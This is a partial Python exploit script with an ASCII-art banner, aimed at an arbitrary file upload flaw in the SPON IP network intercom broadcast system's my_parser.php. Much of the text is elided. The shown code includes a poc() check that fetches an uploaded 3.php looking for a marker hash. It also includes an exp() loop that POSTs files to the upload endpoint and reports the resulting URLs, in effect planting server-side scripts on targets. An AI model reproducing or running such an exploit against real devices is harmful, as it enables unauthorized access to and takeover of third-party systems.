 ...
 ▒▒   ▓▒█░ ▒ ░░     ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒   ░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒      ░▀▀▒ 
  ...
  ░   ▒    ░        ░        ░   ▒   ░        ░ ░░ ░       ░   ░ ░ ░ ░ ░ ▒    ░   ░         ░ 
      ░  ░                       ░  ░░ ░      ░  ░               ░     ░ ░      ░        ░    
                                    ...
                                    @author:           🐖sawa🐇
                                    @version:          1.0.0
                                    For:               世邦通信 SPON IP网络对讲广播系统my_parser.php任意文件上传漏洞
"""
    print(banner)
...
def main():
    banner()
    parser = argparse.ArgumentParser(description="This is a 世邦通信 SPON IP网络对讲广播系统my_parser.php任意文件上传vulnerability")
...
# poc模块
def poc(target):
    payload_url ="/upload/my_parser.php"
    ...
    try:
        ...
        result = target + '/upload/files/3.php'
        res1 = requests.get(url=result,verify=False,timeout=5)
        if  res.status_code == 200 and 'fae0b27c451c728867a567e8c1bb4e53' in res1.text :#and res1.status_code == 200 
...
def exp(target):
    ...
    while True:
        ...
        try:
            res = requests.post(url=target+'/upload/my_parser.php',headers=headers,data=data,timeout=5,verify=False)
            # match = re.search(r'VIDEO/(\d+\.jsp)',res.text)
            result = f"{target}/upload/files/{filename}"
